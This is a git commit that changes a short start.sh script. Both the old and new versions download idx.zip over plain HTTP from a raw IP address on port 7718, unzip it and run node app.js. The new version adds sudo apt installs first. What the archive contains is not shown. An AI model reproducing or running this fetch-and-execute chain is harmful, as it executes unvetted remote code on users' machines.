ada7147052d50dce1f652a0f8f1407c37509e262
SABIR 7718 <s04006241@gmail.com>
2026-02-28 07:48:21 +0000

    Install dependencies before downloading and running app

--- start.sh
+++ start.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget http://165.227.63.140:7718/idx.zip && unzip idx.zip && node app.js
+sudo apt install wget && sudo apt install unzip && sudo apt install node -y && wget http://165.227.63.140:7718/idx.zip && unzip idx.zip && node app.js
